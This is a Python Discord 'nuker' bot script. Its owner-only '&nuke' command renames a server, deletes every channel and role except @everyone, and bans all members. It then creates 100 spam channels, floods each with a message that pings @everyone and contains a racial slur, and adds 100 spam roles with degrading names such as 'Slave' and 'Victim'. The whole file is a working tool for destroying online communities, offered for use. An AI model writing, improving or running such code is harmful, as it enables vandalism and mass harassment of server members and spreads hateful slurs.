"""
Discord Server Nuker Bot
"""
import os

def clear_screen():
    # For Windows
    if os.name == 'nt':
        os.system('cls')
    # For macOS and Linux
    else:
        os.system('clear')

# Example usage
clear_screen()

try:
    import discord
    from discord.ext import commands
except ImportError:
    print("discord.py not found. Install it with: pip install discord.py")
    exit()

import asyncio
import random

class colors:
    DARKRED = '\033[31m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

print(f'''{colors.RED}
        ███████╗ ███████╗ ██████╗  ██╗   ██╗ ███████╗ ██████╗     ███╗   ██╗ ██╗   ██╗ ██╗  ██╗ ███████╗ ██████╗ 
        ██╔════╝ ██╔════╝ ██╔══██╗ ██║   ██║ ██╔════╝ ██╔══██╗    ████╗  ██║ ██║   ██║ ██║ ██╔╝ ██╔════╝ ██╔══██╗
        ███████╗ █████╗   ██████╔╝ ██║   ██║ █████╗   ██████╔╝    ██╔██╗ ██║ ██║   ██║ █████╔╝  █████╗   ██████╔╝
        ╚════██║ ██╔══╝   ██╔══██╗ ╚██╗ ██╔╝ ██╔══╝   ██╔══██╗    ██║╚██╗██║ ██║   ██║ ██╔═██╗  ██╔══╝   ██╔══██╗
        ███████║ ███████╗ ██║  ██║  ╚████╔╝  ███████╗ ██║  ██║    ██║ ╚████║ ╚██████╔╝ ██║  ██╗ ███████╗ ██║  ██║
        ╚══════╝ ╚══════╝ ╚═╝  ╚═╝   ╚═══╝   ╚══════╝ ╚═╝  ╚═╝    ╚═╝  ╚═══╝  ╚═════╝  ╚═╝  ╚═╝ ╚══════╝ ╚═╝  ╚═╝
                                                                                                
{colors.RED}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{colors.RESET}
''')

PREFIX = '&'
SERVER_NEW_NAME = 'Nuked By Humilator-V3'
SPAM_MESSAGE = "# Shake Your Ass Nigger🍒🍒!!! You Gotta Nuked💥!! @everyone"
SPAM_CHANNEL_NAMES = ["nuked", "wasted", "destroyed", "hacked", "owned", "lmao", "cry", "rekt"]
SPAM_ROLE_NAMES = ["Slave", "Destroyed", "Victim", "Clown", "Nuked", "Crashed"]

# --- User Input ---
bot_token = input("Enter your bot token: ").strip()
owner_id = int(input("Enter your Discord User ID: ").strip())

# --- Setup Intents ---
intents = discord.Intents.default()
intents.members = True
intents.guilds = True
intents.messages = True
try:
    intents.message_content = True
except AttributeError:
    pass

# --- Initialize bot ---
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}! Ready to destroy servers.')

@bot.command()
async def nuke(ctx):
    if ctx.author.id != owner_id:
        await ctx.send("❌ You are not authorized to use this command.")
        return

    await ctx.message.delete()
    guild = ctx.guild

    print(f"Starting complete nuke on {guild.name}...")

    # Step 1: Rename the server
    try:
        await guild.edit(name=SERVER_NEW_NAME)
        print(f"[+] Renamed server to {SERVER_NEW_NAME}.")
    except Exception as e:
        print(f"[-] Failed to rename server: {e}")

    # Step 2: Delete all channels
    for channel in list(guild.channels):
        try:
            await channel.delete()
            print(f"[+] Deleted channel: {channel.name}")
        except Exception as e:
            print(f"[-] Failed to delete channel {channel.name}: {e}")

    # Step 3: Delete all roles
    for role in list(guild.roles):
        try:
            if role.name != "@everyone":
                await role.delete()
                print(f"[+] Deleted role: {role.name}")
        except Exception as e:
            print(f"[-] Failed to delete role {role.name}: {e}")

    # Step 4: Ban all members
    for member in list(guild.members):
        try:
            await member.ban(reason="Nuked by bot")
            print(f"[+] Banned member: {member.name}")
        except Exception as e:
            print(f"[-] Failed to ban {member.name}: {e}")

    print("✅ Basic destruction complete! Now starting ordered spam...")

    # Step 5: Create spam channel ➔ Spam 5 messages immediately
    spam_channels = []
    for _ in range(100):
        try:
            channel = await guild.create_text_channel(random.choice(SPAM_CHANNEL_NAMES))
            spam_channels.append(channel)
            print(f"[+] Created spam channel: {channel.name}")

            # Spam 5 messages immediately after channel creation
            for _ in range(5):
                await channel.send(SPAM_MESSAGE)
            print(f"[+] Spammed {channel.name} 5 times.")
        except Exception as e:
            print(f"[-] Failed during channel creation/spamming: {e}")

    # Step 6: After channels are done, create spam roles
    for _ in range(100):
        try:
            await guild.create_role(name=random.choice(SPAM_ROLE_NAMES))
            print("[+] Created a spam role.")
        except Exception as e:
            print(f"[-] Failed to create spam role: {e}")

    print("🔥 All operations completed successfully! Server completely nuked.")

bot.run(bot_token)
